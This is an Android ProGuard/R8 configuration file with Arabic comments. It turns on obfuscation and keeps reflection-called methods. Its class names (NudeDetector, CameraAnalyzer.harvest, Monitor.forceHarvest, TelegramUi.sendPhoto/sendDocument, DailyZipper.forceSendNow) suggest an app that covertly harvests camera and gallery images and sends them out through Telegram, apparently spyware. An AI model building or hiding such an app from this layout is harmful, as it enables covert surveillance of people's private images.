# ============================================================
#  قواعد ProGuard/R8 لحماية الكلاسات المهمة من الإزالة أو التغيير
#  لمنع أخطاء وقت التشغيل (Runtime Errors)
# ============================================================

# ============================================================
#  ✅ تفعيل تحسينات R8 (إعادة التسمية والتصغير)
# ============================================================
-repackageclasses ''
-allowaccessmodification
-optimize

# ============================================================
#  الحفاظ على السمات المطلوبة للانعكاس وتصحيح الأخطاء
# ============================================================
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
-keepattributes Exceptions
-keepattributes LineNumberTable

# ============================================================
#  الحفاظ على كلاسات النقاط الرئيسية (Entry Points) فقط
# ============================================================
-keep public class com.example.app.MainActivity
-keep public class com.example.app.ForegroundService

# ============================================================
#  ✅ حماية دوال الانعكاس (Reflection) المحددة فقط
#  (بدلاً من حفظ الكلاسات كاملة)
# ============================================================
# NudeDetector - دوال تُستدعى من TelegramUi عبر الانعكاس لتحديث النموذج
-keepclassmembers class com.example.app.NudeDetector {
    public *** ensureModelReady(...);
    public *** loadEngineForever(...);
    public *** isReady(...);
}

# Monitor - دوال تُستدعى من Commands و TelegramUi عبر الانعكاس
-keepclassmembers class com.example.app.Monitor {
    public *** getBatteryStatus(...);
    public *** isWifiConnected(...);
    public *** forceHarvest(...);
}

# TelegramUi - دوال تُستدعى من DailyZipper و Commands عبر الانعكاس
-keepclassmembers class com.example.app.TelegramUi {
    public *** getVlt(...);
    public *** getCtrl(...);
    public *** getDat(...);
    public *** sendDocument(...);
    public *** sendPhoto(...);
    public *** sendMessage(...);
    public *** notifyHarvest(...);
}

# CameraAnalyzer - دالة harvest تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.CameraAnalyzer {
    public *** harvest(...);
    public *** capture(...);
}

# GalleryBrowser - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.GalleryBrowser {
    public *** getGridKb(...);
    public *** showOptions(...);
    public *** executeAction(...);
    public *** updateLastMessageId(...);
}

# DailyZipper - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.DailyZipper {
    public *** run(...);
    public *** forceSendNow(...);
}

# ============================================================
#  الحفاظ على الدوال المحددة بواسطة @Keep
# ============================================================
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

# ============================================================
#  الحفاظ على كلاسات الانعكاس الأساسية
# ============================================================
-keep class java.lang.reflect.** { *; }

# ============================================================
#  الحفاظ على TensorFlow Lite (المكتبة الأساسية فقط)
# ============================================================
-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Tensor$* { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-keep class org.tensorflow.lite.DelegateFactory { *; }
-keep class org.tensorflow.lite.nnapi.NnApiDelegate { *; }
-keep class org.tensorflow.lite.gpu.GpuDelegate { *; }
-keep class org.tensorflow.lite.support.** { *; }

# منع التحذيرات من TensorFlow Lite
-dontwarn org.tensorflow.lite.**

# ============================================================
#  الحفاظ على OkHttp (للشبكات)
# ============================================================
-keep class okhttp3.** { *; }
-keep class okhttp3.logging.** { *; }
-keep interface okhttp3.** { *; }
-dontwarn okhttp3.**

# ============================================================
#  الحفاظ على Gson (لتحليل JSON)
# ============================================================
-keep class com.google.gson.** { *; }
-keep class com.google.gson.stream.** { *; }

# ============================================================
#  الحفاظ على مكتبات التشفير والـ Keystore
# ============================================================
-keep class javax.crypto.** { *; }
-keep class javax.crypto.spec.** { *; }
-keep class android.security.keystore.** { *; }

# ============================================================
#  الحفاظ على كلاسات Kotlin الأساسية والـ Coroutines
# ============================================================
-keep class kotlin.** { *; }
-keep class kotlinx.coroutines.** { *; }

# ============================================================
#  الحفاظ على كلاسات JSON
# ============================================================
-keep class org.json.** { *; }

# ============================================================
#  الحفاظ على كلاسات التسلسل (Serialization)
# ============================================================
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ============================================================
#  منع إزالة أي دالة أو حقل يحتوي على "serialVersionUID"
# ============================================================
-keepclassmembers class * {
    private static final long serialVersionUID;
}

# ============================================================
#  الحفاظ على كلاسات الإنشاء الديناميكي
# ============================================================
-keepclasseswithmembers class * {
    public <init>(...);
}

# ============================================================
#  منع تحذيرات R8 من المكتبات الخارجية
# ============================================================
-dontwarn javax.**
-dontwarn kotlin.**
-dontwarn com.google.api.client.**
-dontwarn com.google.crypto.tink.**

# ============================================================
#  نهاية القواعد
# ============================================================
